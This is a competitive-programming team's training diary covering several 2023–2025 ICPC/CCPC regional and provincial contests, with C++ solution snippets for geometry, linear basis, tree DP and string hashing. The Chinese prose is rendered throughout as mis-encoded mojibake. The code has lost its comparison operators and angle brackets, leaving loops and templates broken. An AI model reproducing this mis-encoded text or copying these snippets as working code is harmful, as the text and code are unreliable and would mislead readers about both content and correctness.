‘ï¼Œç«Ÿç„¶ä¸€å‘é€šè¿‡ï¼Œä¸çŸ¥é“æœ‰æ²¡æœ‰æƒ³å¤æ‚ã€‚ å¤§å®¶ä¸€èµ·çœ‹ Hï¼ŒçŒœæµ‹æ˜¯è´ªå¿ƒä½†æ˜¯åˆæœ‰ç‚¹ä¸ä¼šè¯æ˜ã€‚è¿™æ—¶å€™ Zlw æƒ³åˆ°äº†ä¸€ä¸ªç½‘ç»œæµåšæ³•å¹¶ä¿è¯äº†æ­£ç¡®æ€§ï¼Œç”±äºæˆ‘å’Œ Sky å¯¹è¿™é¢˜éƒ½æ²¡å•¥æƒ³æ³•ï¼Œäºæ˜¯å°±è®© Zlw å¼€å†™ï¼ˆå› æ­¤ä¹Ÿåœ¨ä¸æ­£è§£è¶Šèµ°è¶Šæ™šï¼‰ã€‚å¥½ä¸å®¹æ˜“å†™å®Œä»¥åï¼Œä¸€äº¤ TLEï¼Œè¿™ä¸‹å®Œè›‹ï¼Œè¢« $m$ å¾ˆå°çš„ç‚¹å¡äº†ï¼Œä¹Ÿæ²¡æ³•ä¼˜åŒ–ã€‚å¥½ï¼Œè¿™ä¸‹è¢«çœŸçš„å¡ä½äº†ï¼Œå·²ç»å°†è¿‘ 1.5 h æ²¡æœ‰è¿‡é¢˜ã€‚ å¥½åœ¨ Zlw é‡æ–°æ€è€ƒè´ªå¿ƒåšæ³•ï¼Œå¹¶ç”¨å°è¯•ä¼˜å…ˆé˜Ÿåˆ—å»ç»´æŠ¤ï¼Œåœ¨å››å°æ—¶ä¸åˆ°ä¸€ç‚¹çš„æ—¶å€™é€šè¿‡ã€‚æˆ‘å’Œ Sky åœ¨å¼€ Kï¼Œæˆ‘æå‡ºç»´æŠ¤æœ€åˆæ¯ä¸€ä¸ªå­—ç¬¦æ‰€æ‰©å±•åˆ°çš„åŒºé—´ $l_i,r_i$ï¼ŒSky æ¨äº†æ¨å‘ç°æ˜¯å¯ç»´æŠ¤çš„ï¼ˆè™½ç„¶è¦åˆ†å¥½å‡ ç±»ï¼‰ã€‚ä½† Sky å¹¶ä¸æ˜¯å¾ˆæ“…é•¿çº¿æ®µæ ‘ï¼Œäºæ˜¯æˆ‘å…ˆå¼€å§‹ä¸Šæœºå†™åŒºé—´åŠ å’Œä¹˜ï¼Œç„¶åè®©ä»–æŠ¥ç»™æˆ‘åŒºé—´æ›´æ–°çš„å…·ä½“å†…å®¹ã€‚æœ¬æ¥æ˜¯æŠ¥ç€æ‰“å®Œè¿™é“é¢˜è¿˜è¦è°ƒè¯•ä¸€ä¸‡å¹´çš„ï¼Œä½†æ˜¯æˆ‘ç¨å¾®ä¿®æ”¹äº†ä¸€ä¸‹æˆ‘æŸ¥è¯¢å†™æŒ‚çš„åœ°æ–¹ï¼Œä¹‹åç«Ÿç„¶ç›´æ¥è¿‡æ ·ä¾‹ã€‚ç›´æ¥äº¤ï¼REï¼å™¢æ˜¯æœ‰ä¸ªåœ°æ–¹æ²¡å¼€ long longï¼å†äº¤ï¼ACï¼æˆ‘ä»¬ç‹‚å–œï¼ è¿˜å‰©ä¸‹ 20 minï¼Œå°è¯•å¼€ C äº¤äº’ï¼Œä½†æ˜¯æ²¡å•¥æƒ³æ³•ï¼Œæœ€å 7 é¢˜æ”¶å°¾ï¼ C ä»é›†åˆä¸é›†åˆä¹‹é—´çš„è¯¢é—®å‡ºå‘ï¼Œé€šè¿‡äºŒåˆ†æ‰¾åˆ°èƒ½ä¸é›†åˆè¿è¾¹çš„å•ç‚¹ã€‚å…·ä½“æ¥è¯´ï¼Œ$L$ ä¸ $R = R_1 \\cup R_2$ è·å¾— $a + c$ï¼Œç„¶åäºŒåˆ†å³ä¾§è·å¾— $R_1,R_2$ã€‚ä¹‹åè¿›è¡Œè¿›ä¸€æ­¥åœ°è¯¢é—®ï¼Œ$L\\cup R_1$ ä¸ $R_2$ è¯¢é—®è·å¾— $b + c$ï¼Œï¼Œ$L \\cup R_2$ ä¸ $R_1$ è¯¢é—®è·å¾— $a + b$ã€‚è‹¥ $a + b + a + c = b + c$ï¼Œåˆ™ $a = 0$ï¼Œä¹Ÿå°±è¯´æ˜ $R$ ä¸­åªæœ‰ $R_2$ ä¸ $L$ æœ‰ç›´æ¥è¿è¾¹ã€‚å› æ­¤ $n$ è½®æ¯æ¬¡è·å¾—ä¸€ä¸ªç›´æ¥ç›¸è¿çš„ç‚¹ï¼Œè¯¢é—®æ¬¡æ•°åœ¨ $n + 2n \\log n$ã€‚ 2025.05.27 The 2024 ICPC Central Europe Regional Contestå¼€å±€ B,C,D ç­¾åˆ°ã€‚ç„¶åçœ‹ Lï¼Œæœç´¢é¢˜çš„å˜ç§ï¼Œä¸€çœ¼çŒœæµ‹éœ€è¦å†åŠ ä¸€ä¸ªç»´åº¦è¡¨ç¤ºæœå‘ï¼Œä½†æ˜¯ä¸å¤ªæƒ³å†™ï¼Œä¸¢ç»™ Zlw äº†ã€‚ çœ‹ Iï¼Œæ²¡æƒ³æ³•ï¼›çœ‹ Kï¼Œä»¥ä¸ºæ˜¯æ„é€ ï¼Œä½†æ˜¯å‘ç°å¯èƒ½æ˜¯æœç´¢ã€‚å‘ç°å¥‡æ•°å’Œå¶æ•°çš„ä½ç½®ä¸€å®šæœ‰ä¸€ç§æ˜¯éœ€è¦å…¨å¡«çš„ï¼Œä½†æ˜¯å‰©ä½™çš„ä½ç½®è¿˜æœ‰ 32 ä¸ªï¼Œç›´æ¥æš´åŠ›ä¸å¯è¿‡ï¼Œäºæ˜¯å¼€å§‹å„ç§ä¹±æã€‚ä½†æ˜¯æ€ä¹ˆå°è¯•éƒ½ WAï¼Œäºæ˜¯å¼€æ‘†ï¼ˆ Sky æˆåŠŸæŠŠ I åšå‡ºæ¥äº†ï¼ŒçœŸæ˜¯å¤ªæœ‰å®ç²’äº†ï¼å…ˆå…¥ä¸ºä¸»çš„ä¼šå»æƒ³è¡Œä¸è¡Œä¹‹é—´çš„å…³ç³»ï¼Œå¯æ˜¯å¦‚æœè€ƒè™‘åˆ—ï¼Œå¯¹äºç¬¬ $i$ ä¸ªä½ç½®ï¼Œè¿›è¡Œå˜æ¢ $k \\to k+1$ï¼Œå³ $S_k[i] = S_{k+1}[P(i)]$ï¼Œå°†è¿™æ¡çº¦æŸåœ¨ $k=1,2,\\ldots,k-1$ éƒ½å†™å‡ºæ¥ï¼š \\begin{pmatrix} S_1[i] \\\\ S_2[i] \\\\ \\vdots \\\\ S_{k-1}[i] \\end{pmatrix} \\to \\begin{pmatrix} S_2[P(i)] \\\\ S_3[P(i)] \\\\ \\vdots \\\\ S_k[P(i)] \\end{pmatrix}ä¹Ÿå°±æ˜¯è¯´ï¼Œç”¨ç¬¬ $1,\\cdots,kâˆ’1$ è½®çš„åˆ—å‘é‡å»åŒ¹é…ç¬¬ $2,\\cdots,k$ è½®çš„åˆ—å‘é‡ï¼Œè´ªå¿ƒæ‰¾æœ€å°å€¼å³å¯ã€‚ Zlw ç»§ç»­å¼€ F æ•°æ®ç»“æ„ï¼Œä¸Šæœºå†™ç€å†™ç€æ„Ÿè§‰å¤ªéº»çƒ¦äº†ï¼Œåˆå¼€æ‘†ï¼ˆ æœ€å 5 é¢˜æ”¶å°¾äº†ï¼ˆå¤ªç´¯äº†ï¼Œå¼€å¯ä¼‘æ•´æ¨¡å¼ qwqï¼‰ã€‚èµ›åè¿˜æ˜¯çœ‹äº†ä¸‹ K åˆ«äººçš„ä»£ç ï¼Œå‘ç°å°±æ˜¯ç–¯ç‹‚å‡æçš„çˆ†æœï¼Œè¿™ç§é¢˜éƒ½èƒ½ä¸ŠåŒºåŸŸèµ›ï¼Ÿæœ‰ç‚¹ç¦»è°±äº†ï¼ 2025.05.29 The 2023 ICPC Asia Jinan Regional ContestD ç­¾åˆ°ï¼Œé¹Šå·¢åŸç†ä¹‹åå°±ä¼šå¼‚å¸¸å¥½åš(Zlw ä½¬ä¸€å¼€å§‹æ²¡çœ‹å‡ºæ¥ï¼Œå·®ç‚¹å†™æˆæ•°ä½ DP)ã€‚Sky çŒœäº†ä¸€ä¸ª I çš„ç»“è®ºï¼Œä¸€å‘é€šè¿‡ï¼æˆ‘çœ‹ Aï¼Œä¸€ä¸‹å­æ²¡æƒ³æ³•ï¼Œå’Œ Zlw è®¨è®ºäº†ä¸€ä¸‹çªç„¶ä¼šäº†ï¼Œåªè¦è´ªå¿ƒè¿˜åŸï¼Œç„¶ååªè¦æœ‰ä¸€ä¸ªå³æ‹¬å·çš„å³ä¾§å­˜åœ¨ä¸€ä¸ªå·¦æ‹¬å·ï¼Œå¹¶ä¸”ä¸­é—´æ˜¯åˆæ³•çš„å³å¯ã€‚æ„Ÿè§‰å¾ˆå¯¹ï¼Œä¸¢ç»™ Zlw å»å†™äº†ã€‚ å°è¯•çœ‹ Kï¼ŒçŒœæƒ³äºŒåˆ†ï¼Œä½†æ˜¯ check å¾ˆéš¾å†™ã€‚Zlw ä½¬çœ‹äº†é¢˜ï¼Œä¸€çœ¼ä¸­ä½æ•°æœ€ä¼˜ï¼Œç„¶åå°è¯•ç”¨å¯¹é¡¶å †å»ç»´æŠ¤ï¼Œä¼¼ä¹å¤šäº†ä¸€ä¸ª $\\log$ï¼Œä½†æ˜¯å¥½åœ¨ä¸€å‘é€šè¿‡ï¼æ¥ç€ Sky å–‚ç»™æˆ‘ä¸€ä¸ª G é¢˜çš„åšæ³•ï¼Œç›´æ¥ä¸Šæœºå†™å¹¶æŸ¥é›†ï¼Œå†™å®Œå WAï¼Œæˆ‘æ€è€ƒäº†ä¸€ä¼šå„¿æƒ³åˆ° 1010 1100 è¿™ç§æ—¢äº’æ–¥åˆäº’è¡¥çš„åšæ³•ï¼Œæœ¬æ¥æƒ³è¦ç‰¹åˆ¤ï¼Œä½†æ˜¯å‘ç°è¿™æ˜¯ä¸€ç±»æ²¡æœ‰è€ƒè™‘åˆ°çš„æƒ…å†µã€‚Zlw å³æ—¶çš„æå‡ºäº†è¿™å°±æ˜¯ 2-SATï¼Œç›´æ¥ä¸Šæ‰©å±•åŸŸå¹¶æŸ¥é›†å³å¯ã€‚ä¿®äº†å¥½ä¹…ï¼Œæ€»ç®—é€šè¿‡äº†ã€‚å…¶é—´çº¢æ¸©äº†å¥½ä¹…ï¼Œä¸‹æœºç¼“äº†ç¼“ï¼Œè€Œè¶ç€è¿™ä¸ªæ—¶é—´ä»–ä¿©è®¨è®ºå‡ºäº† E çš„ç½‘ç»œæµåšæ³•ï¼Œå¹¶ä¸€å‘ ACï¼ŒçœŸçš„å¤ªæœ‰å®ç²’äº†ï¼ æœ€åå¼€äº† Mï¼Œæƒ³åˆ°å…ˆæ±‚å‡¸åŒ…ï¼Œç„¶åæšä¸¾ä¸€ä¸ªåŸºå‡†ç‚¹ï¼Œç”¨æè§’æ’åºå’ŒåŒæŒ‡é’ˆæ¥ç»´æŠ¤ç­”æ¡ˆï¼Œæ—¶é—´å¤æ‚åº¦ $O(n^2 \\log n)$ã€‚æƒ³å¾—éå¸¸æ­£ç¡®ï¼Œä½†ç”±äºå¯¹æè§’æ’åºéå¸¸çš„ä¸ç†Ÿæ‚‰ï¼Œç”¨ atan2 è¶…æ—¶äº†ï¼Œç„¶åæƒ³è¦æ”¹æˆå‰ä¹˜å´åˆå‘ç°ä¸å¯¹ï¼Œè¿˜å‰©ä¸€ä¸ªå°æ—¶ä½†æ˜¯ä¹Ÿæ²¡è°ƒå‡ºæ¥ï¼Œæˆç½ªäººäº†ï¼ˆ å¥½åœ¨å…­é¢˜æ”¶å°¾ï¼Œå¹¶ä¸”åªæœ‰ä¸€å‘ç½šæ—¶ï¼ èµ›åè¡¥é¢˜ï¼Œå‘ç° M çš„è‡´å‘½é”™è¯¯ï¼š åˆ¶ä½œæ¨¡æ¿çš„æ—¶å€™å†™çš„æ˜¯ 0-vectorï¼Œè€Œä¸€å¼€å§‹è‡ªå·±å†™çš„å´æ˜¯ 1-vectorã€‚ ç›´æ¥é¢„å¤„ç†äº† atan2 åå†æ’åºï¼ŒæŠŠè¶…æ—¶é—®é¢˜è§£å†³äº†ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯çœŸçš„æ…¢å•Šï¼ï¼ï¼ åˆ¤æ–­ç‚¹æ˜¯å¦åœ¨ä¸‰è§’å½¢å†…ç”¨çš„æ˜¯è§’åº¦çš„åšæ³•ï¼Œä½†æ˜¯æœ‰ç²¾åº¦è¯¯å·®å¯¼è‡´ä¸€ç›´ WA æ‰ã€‚æœ€åæ”¹æˆçœ‹ç©¿å…¥ç©¿å‡ºçš„å¥‡å¶æ€§ä¹‹åå°±å¯¹äº†ã€‚ int in_Poly (vector Point P,Point A) int cnt = 0,n = P.size (); for (int i = 0;i n;++i) int j = (i + 1) % n; if (on_seg (A,P[i],P[j])) return 2;// on the edge if (A.y = min (P[i].y,P[j].y) A.y max (P[i].y,P[j].y)) // the intersection is on the right cnt += dcmp (((A.y - P[i].y) * (P[j].x - P[i].x) / (P[j].y - P[i].y) + P[i].x) - A.x) 0; return cnt 1; 2025.05.30 ç¬¬ä¹å±Šä¸­å›½å¤§å­¦ç”Ÿç¨‹åºè®¾è®¡ç«èµ› æ¡‚æ—ç«™ï¼ˆCCPC 2023 Guilin Siteï¼‰çœèµ›å‰æœ€åä¸€è®­ï¼ G é¢˜é¢å†™å¾—å®åœ¨æœ‰ç‚¹ä¸€è¨€éš¾å°½ï¼Œè¯»æ‡‚é¢˜ç›®åå‘ç°æ˜¯å¼±æ™ºé¢˜ï¼Œé€Ÿé€Ÿé€šè¿‡ã€‚æ¥ç€åˆå¾ˆå¿«çš„ç­¾å®Œ Mã€‚ ä¹‹åçœ‹äº† Kï¼Œå‘ç° $n \\times m \\le 180$ çš„æ•°æ®èŒƒå›´å¾ˆè¯¡å¼‚ï¼Œå‘ç°å¯ä»¥é’ˆå¯¹ $n$ è¾ƒå°å’Œ $m$ è¾ƒå°å†™æš´åŠ›ï¼Œè°ƒäº†ä¸€ä¼šå„¿ä¸‰å‘é€šè¿‡ï¼ˆä¹‹åçœ‹é¢˜è§£å‘ç°ç­”æ¡ˆæ•°é‡æœ‰é™ï¼Œç›´æ¥ç”¨ map è·‘æš´åŠ›å³å¯ï¼‰ã€‚ ä¹‹åçœ‹ B,Cï¼Œå‘ç°éƒ½ä¸å¥½åšï¼Œäºæ˜¯å¼€å§‹åç‰¢ã€‚B çš„è´ªå¿ƒæƒ…å†µå¾ˆå¤šï¼ŒSky ä¸€ç›´åœ¨çº¢æ¸©ï¼Œæˆ‘å’Œ Zlw å°è¯•åš Cã€‚C çš„å¼å­å¾ˆæ˜¯ç‰¹æ®Šï¼Œç”±äºå¼‚æˆ–æ˜¯ä¸è¿›ä½åŠ æ³•ï¼Œæ‰€ä»¥ $\\operatorname{lcm} \\{a_{i_j}\\} \\mid \\bigoplus_{j=1}^m a_{i_j}$ æˆç«‹åªæœ‰ $\\bigoplus_{j=1}^m a_{i_j} = 0$ æˆ– $\\bigoplus_{j=1}^m a_{i_j} = \\operatorname{lcm} \\{a_{i_j}\\} = \\max \\{a_{i_j}\\}$ã€‚å¯¹äºç¬¬ä¸€ç§æƒ…å†µï¼Œç›´æ¥è·‘çº¿æ€§åŸºï¼Œç­”æ¡ˆä¸º $2^{n - r}$ï¼Œ$r$ ä¸ºç§©ã€‚å¯¹äºç¬¬äºŒç§æƒ…å†µï¼Œå…ˆç”¨ $\\log$ å¤æ‚åº¦é¢„å¤„ç†æ¯ä¸€ä¸ªæœ€å¤§å€¼çš„çº¦æ•°ï¼Œç„¶åä¸¤è¾¹åŒæ—¶å¼‚æˆ–ä¸Šæœ€å¤§å€¼å°±è§„çº¦ä¸ºç¬¬ä¸€ç§æƒ…å†µï¼Œå†è·‘çº¿æ€§åŸºå³å¯ï¼Œæ”¾ä¸ªä»£ç ï¼š int main () vector vector int d (200001); for (int i = 1;i = 200000;++i) for (int j = i;j = 200000;j += i) d[j].push_back (i); t = read (); while (t--) n = read (); vector int cnt (n + 1,0);Basis int basis (n,20); for (int i = 0;i n;++i) int x = read ();++cnt[x]; basis.modify (x); int ans = (qpow (2,n - basis.query ()) + MOD - 1) % MOD; for (int i = 1;i = n;++i) if (!cnt[i]) continue; int tot = 0; Basis int tmp (n,20); for (auto v : d[i]) if (cnt[v]) tmp.modify (v),tot += cnt[v]; ans = (ans + qpow (2,tot - tmp.query ()) % MOD) % MOD; printf (%d ,ans); return 0; ä¹‹å Sky å°è¯•å†™ Bï¼Œä½†æ˜¯ä¸€ç›´åœ¨è°ƒã€‚æˆ‘å’Œ Zlw è®¨è®ºäº† H å¹¶å¾—åˆ°äº†ä¸€ä¸ªæ„Ÿè§‰ç›¸å½“æ­£ç¡®çš„çŒœæƒ³ã€‚Zlw è¿˜çœ‹äº† Iï¼Œä¸è¿‡æ²¡æœ‰ä»€ä¹ˆéå¸¸å¥½çš„æƒ³æ³•ã€‚ æ‰“åˆ°åé¢ç¨ç¨æœ‰ç‚¹ç´¯ï¼Œäºæ˜¯ B æ²¡è°ƒå‡ºæ¥ã€‚H æˆ‘å°±æœ€å 10 min ä¸Šæœºå°è¯•å†™äº†ä¸€ä¸‹ï¼Œç»“æœè¢« corner case å¡äº†ã€‚ å±åˆ°åº•è¿˜æ˜¯è¦åƒçš„ã€‚èµ›å Zlw çœ‹äº† I çš„é¢˜è§£æç„¶å¤§æ‚Ÿï¼Œå…‰é€Ÿè¿‡é¢˜ï¼›Sky åœ¨å‘ç°è‡ªå·±çš„ç¨‹åºè¢«å¡è¶…æ—¶åå¥½ä¸å®¹æ˜“æ”¹æˆ $\\log$ å¹¶é€šè¿‡äº† Bï¼›è€Œæˆ‘ï¼Œåœ¨å‘ç°è¿˜è¦è®°å½•å¶å­èŠ‚ç‚¹ä¸Š $1$ çš„ä¸ªæ•°ï¼ˆå¯ä»¥åˆæˆä¸€ä¸ª $2$ï¼‰åä¹Ÿé€šè¿‡äº† Hã€‚ auto dfs = [] (auto self,int u,int fa) - void w[u] = a[u];one[u] = a[u] == 1; for (auto v : ve[u]) if (v == fa) continue; self (self,v,u); w[u] += w[v]; odd[u] = min (odd[u],odd[v]); even[u] = min (even[u],even[v]); one[u] += one[v]; if (w[u] 1) odd[u] = min (odd[u],w[u]); else if (w[u] != 0) even[u] = min (even[u],w[u]); if (w[u] k) return ; if (w[u] == k) ++ans,w[u] = one[u] = 0,odd[u] = even[u] = INF; else if (w[u] k) int del = w[u] - k; if (del % 2 == 1 odd[u] = del) ++ans,w[u] = 0,odd[u] = even[u] = INF; if (del % 2 == 0 (even[u] = del || one[u] = 2)) ++ans,w[u] = one[u] = 0,odd[u] = even[u] = INF; ; å®³ï¼Œåªä¸è¿‡èµ›æ—¶å•¥å®åŠ›ä¸å‰©ï¼Œåªå‰©ä¸‹çº¢æ¸©äº†â€¦â€¦ 2025.06.02 çœèµ› The 2025 Guangdong Provincial Collegiate Programming Contestå‡ºå¾çœèµ›ï¼æ·±åœ³æŠ€æœ¯å¤§å­¦çš„æ ¡å›­çœŸæ˜¯å¼€æ”¾ï¼Œè¿›å‡ºé—¨å®Œå…¨æ²¡æœ‰äººç®¡ï¼Œæ ¡å›­å¾ˆå¤§ï¼Œè€Œä¸”å•æ‰€é‡Œæœ‰ç©ºè°ƒï¼ è¿›åˆ°æœºæˆ¿ä»¥åï¼Œå‘ç°æœ‰ vscodeï¼Œç„¶åç›‘è€ƒä¸€ä¼šå„¿è¯´å¯ä»¥ç”¨ï¼Œä¸€ä¼šå„¿åˆè¯´ä¸å¯ä»¥ï¼ˆç¬‘è¯ï¼‰ã€‚åœ¨å»¶è¿Ÿäº† 15 min å·¦å³ä»¥åç»ˆäºå¼€å§‹æ¯”èµ›ï¼Œå¥½åœ¨ PTA è¿™æ¬¡æ²¡ç‚¸ã€‚ å‘ç° D æ˜¯ç­¾åˆ°ï¼ŒZlw å…ˆæ•²äº†ï¼Œç„¶åå‘ç° dev çš„ -std=c++14 ä¸èƒ½ç”¨ï¼Œæ”¹æˆ c++11ï¼Œä»ç„¶æŠ¥é”™ï¼å¥½äº†ï¼Œè¿™ä¸‹ç›´æ¥é€€åŒ–æˆ c++98ï¼Œä½œä¸ºä¸€ä¸ª auto é€‰æ‰‹ï¼Œç›´æ¥å€’é—­ï¼ˆäºæ˜¯æ¥ä¸‹æ¥ï¼Œæˆ‘éƒ½æ‹’ç»ä¸Šæœºã€‚ D å†™å®Œåï¼ŒSky å¼€å§‹å†™æ¨¡æ‹Ÿ Fï¼Œå†™äº†å‡ å‘éƒ½æ²¡è¿‡ï¼Œäºæ˜¯ Zlw å…ˆä¸Šæœºä¸€å‘è¿‡äº† Gã€‚ç„¶åæˆ‘å†å¬äº† Sky çš„æ€è·¯ä»¥åï¼Œæä¸æƒ…æ„¿çš„ä¸Šæœºå¼€å§‹è°ƒï¼Œçœ‹äº†åŠå¤©ä»¥åç›´æ¥é‡æ„ï¼Œä¸€äº¤ç»§ç»­ WAï¼Œæƒ³äº†ä¸€ä¼šå„¿ä»¥åå‘ç°æ€è·¯æœ‰é—®é¢˜ï¼ŒåŠ äº†ä¸€ä¸ªè´ªå¿ƒçš„æ’åºä»¥åå†äº¤ï¼Œè¿˜æ˜¯ WAï¼æˆ‘å¼€å§‹çº¢æ¸©ï¼Œå†çœ‹äº†å¾ˆå¤šéä»¥åå‘ç°æœ‰ä¸ªåœ°æ–¹å¿˜è®°å†™ + äº†ï¼Œèµ¶ç´§æ”¹ï¼Œç»ˆäºå† WA6 ä»¥åé€šè¿‡ï¼Œæˆå¤§ç½ªäººäº†ã€‚ ä¹‹åæ˜¯ Hï¼Œå‘ç°è´ªå¿ƒè¿è¾¹ä»¥åç›´æ¥è·‘ DP å°±èƒ½æ±‚å‡ºæ‰€æœ‰æœ¬è´¨ä¸åŒçš„å­ä¸²ï¼Œä¸¤å‘é€šè¿‡ã€‚ç„¶åçœ‹äº† Jï¼Œå’Œ Zlw ç®€å•å¯¹äº†æ€è·¯ä»¥åå‘ç°ç”¨ä¼˜å…ˆé˜Ÿåˆ—ç»´æŠ¤å³å¯ã€‚ç”±äºæˆ‘ä¸æƒ³å†ä¸Šæœºå†™ä»£ç ï¼Œäºæ˜¯ç»§ç»­ push äº† Zlwã€‚ è¿˜æœ‰å°†è¿‘ä¸¤å°æ—¶ï¼Œçœ‹ Iï¼Œæˆ‘å…ˆæƒ³äº†å¤§æ¦‚çš„æ€è·¯ï¼Œä½†æ˜¯è¦ä¸Šæœºæ•²ä»£ç çš„æ—¶å€™å‘ç°æ¼è€ƒè™‘äº†å®¹æ–¥çš„éƒ¨åˆ†æƒ…å†µã€‚äºæ˜¯ Zlw ç»§ç»­å‘åŠ›ï¼Œæå‡ºç›´æ¥æš´åŠ›è€ƒè™‘ä¸‰åˆ—çš„æƒ…å†µã€‚å†™äº†åŠå¤©åœ¨è¿˜æœ‰ä¸åˆ°åŠå°æ—¶ä»¥åè¿‡äº†æ ·ä¾‹ï¼Œç›´æ¥äº¤ï¼WAï¼ åäº†ï¼Œç»§ç»­è°ƒè¯•ï¼Œå‘ç°å†™å¾—ä¼¼ä¹éƒ½æ²¡é—®é¢˜ï¼Œç»§ç»­äº¤äº†å‡ å‘ï¼Œä¸€ç›´åˆ°èµ›åä¹Ÿæ²¡è¿‡â€¦â€¦äº”é¢˜æ”¶å°¾ï¼ æœ¬æ¥ä»¥ä¸ºåªæœ‰ Cuï¼Œåæ¥å‘ç° Ag çš„æ¯”ä¾‹ä¹Ÿæœ‰ $20\\%$ï¼Œæœ€å rk62 Agï¼ˆè¿˜è¢«å¦ä¸€æ”¯æ ¡é˜Ÿä¼ä» $4 \\to 6$ ç¿»ç›˜ï¼ŒçœŸçš„æ˜¯ä¸å°æ¦œä¸ä¼šå†™ä»£ç äº†ï¼‰ã€‚ èµ›åè¡¥é¢˜ï¼š I å‘ç°çœ‹é”™é¢˜äº†ï¼Œæœ‰ä¸€åªé˜Ÿä¼éœ€è¦å¼ºåˆ¶é€‰æ‹©ï¼Œè€Œæˆ‘ä»¬åœ¨ä¸€æ¬¡æ¬¡è½¬è¿°é¢˜æ„ä¹‹åå‡ºç°äº†å·®é”™ï¼Œå¯¼è‡´æ²¡è¿‡é¢˜çš„æƒ¨å‰§ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬çš„æ–¹æ³•åšæˆäº†æ›´åŠ å¤æ‚çš„ç‰ˆæœ¬ï¼Œå› æ­¤æˆ‘åŠ äº†ç‚¹è¡¥ä¸ä»¥åç›´æ¥è¿‡äº†ã€‚ A Zlw çš„æ€è·¯å¤§è‡´æ­£ç¡®ï¼Œäºæ˜¯èµ›åäº¤äº†å‡ å‘ä»¥åé€šè¿‡ã€‚å…¶é—´ WA æ—¶å› ä¸ºæŸäº› long long å’Œ int128 çš„é—®é¢˜ï¼Œæœ€åè·ªç€æ¥ï¼ˆ`#define long long int128`ï¼‰ å°±è¿‡äº†ã€‚ æˆ‘è¡¥äº† Kï¼Œç›´æ¥ä¸Šå“ˆå¸Œã€‚å‘ç°ç­”æ¡ˆé€’å¢ï¼Œç„¶åç”¨å“ˆå¸Œåˆ¤æ–­å›æ–‡ï¼Œç”¨å“ˆå¸Œå’Œç­‰æ¯”æ•°åˆ—å…¬å¼éªŒè¯æ˜¯å¦å­˜åœ¨å¾ªç¯èŠ‚ã€‚ç›´æ¥æšä¸¾ç­”æ¡ˆä»¥åŠ $[1,i]$ çš„è¯¢é—®å³å¯ã€‚ Hash dl (s);reverse (s.begin (),s.end ());Hash dr (s);for (int i = 1;i = n;++i) auto check = [] (int x) - bool if (x == 1) return dl.get (1,i) == ((dl.get (1,1) * (Z ll,MOD (1) - dl.get_pw (i))) / (Z ll,MOD (1) - base)); if (x * 2 - 1 = i) Z ll,MOD dx = dl.get (2 * x - i,x),dy = dr.get (n - i + 1,n - x + 1); return dx == dy; int r = x * 2 - 1; Z ll,MOD dx = dl.get (1,r),dy = dr.get (n - r + 1,n); if (dx != dy) return false; --r; dx = dl.get (1,r) * (Z ll,MOD (1) - (dl.get_pw (r) ^ (i / r))) / (Z ll,MOD (1) - dl.get_pw (r)); dx = dx * dl.get_pw (i % r) + dl.get (1,i % r); return dx == dl.get (1,i); ; for (int j = res;j = i;++j) if (check (j)) res = j;break; ans ^= 1ll * i * res; 8-9 æœˆè®­ç»ƒ2025ç‰›å®¢æš‘æœŸå¤šæ ¡è®­ç»ƒè®°å½• 2025.08.30 CCPC 2023 Harbin SiteD,G è¢« Zlw ç§’äº†ï¼ŒJ,M è¢« Sky ç§’äº†ï¼ŒB,L è¢« Zlw æ•‘äº†ï¼ B çœ‹ä¸Šå»æ˜¯ç­¾åˆ°ï¼Œæˆ‘å…ˆä¸Šæœºå¼€å†™ã€‚æ³¨æ„åˆ°äº†å¤šæ¬¡é™¤ä»¥ $2$ æœ‰å¯èƒ½ä¼šé€ æˆç²¾åº¦é—®é¢˜ï¼Œæ‰€ä»¥å°±åŠ äº†ä¸ª epsã€‚ä½†æ˜¯äº¤ä¸Šå»è¿˜æ˜¯ WA äº†ï¼Œè¿™æ—¶å€™è¢« Zlw æ•‘æ•‘ï¼Œè¯´å¯ä»¥æŠŠé™¤ä»¥ $2$ ç§»é¡¹æ”¹ä¸ºä¹˜ $2$ï¼Œç„¶åç”¨ Python æ¥å†™ã€‚æˆ‘æœæ–­é‡‡å–å»ºè®®ï¼Œä¿®æ”¹åé€šè¿‡ï¼ æ¥ä¸‹å» M æ˜¯ä¸€é“ç®€å•æ¨¡æ‹Ÿï¼Œå°±äº¤ç»™ Sky æ¥å†™ã€‚èŠ±äº† 20 min å·¦å³ï¼Œè¿‡æ ·ä¾‹ä»¥åä¸€å‘é€šè¿‡ã€‚ æˆ‘æ¥ä¸‹å»çœ‹äº† Lï¼Œæƒ³åˆ°å¯ä»¥å›ºå®šç¬¬ä¸€ä½æ•°ï¼Œç„¶ååé¢çš„æ•°é€šè¿‡ 2 æ“ä½œåœ¨è½¬ï¼Œç±»ä¼¼æ’å…¥æ’åºçš„åŸç†ã€‚ä½†æ˜¯åœ¨å®ç°ä¸Šå‡ºç°äº†é—®é¢˜ï¼Œæ²¡æœ‰è€ƒè™‘åˆ°ç¬¬ä¸€ä¸ªä½ç½®æ•°çš„é¡ºåºé—®é¢˜ä»è€Œæ— æ³•æ­£ç¡®æ’åºã€‚ Zlw ä¸Šæ¥å°±åœ¨çœ‹ Dï¼Œä¸€é“æ•°è®ºå’Œå›¾è®ºçš„ç»“åˆé¢˜ã€‚ä½¬åœ¨æƒ³æ˜ç™½åªéœ€è¦è€ƒè™‘ä»·å€¼ä¸º $\\omega(w)$ å’Œ $\\omega(w + 1)$ çš„è¾¹ä»¥åå°±ä¼šäº†ï¼Œé¢„å¤„ç†åç›´æ¥æœ€å°ç”Ÿæˆæ ‘å³å¯ã€‚åæ¥çœ‹äº† XCPC boardï¼Œå‘ç°å·®ä¸€å‘å°±æ˜¯ä¸€è¡€ï¼Œæ˜¯ä¸€é“ Au é¢˜ï¼ å†™å®Œ D å Zlw ä½¬çœ‹æˆ‘çº¢æ¸©äº†ï¼Œäºæ˜¯äº¤æµäº†ä¸€ä¸‹æŒ‡å‡ºæˆ‘çš„é—®é¢˜ï¼Œå¹¶æŠŠæˆ‘è¸¹ä¸‹å»é‡æ–°å®ç°äº†ã€‚ æˆ‘å’Œ Sky å¼€å§‹è®¨è®º J åšå¼ˆè®ºã€‚Sky é¦–å…ˆåˆ—å‡ºäº†å¾ˆå¤§çš„ä¸€å¼ è¡¨æ ¼ï¼Œå°è¯•å»æ‰¾è§„å¾‹ã€‚ç„¶åæˆ‘å¯¹äºä¸€æ£µæ ‘ï¼Œæ 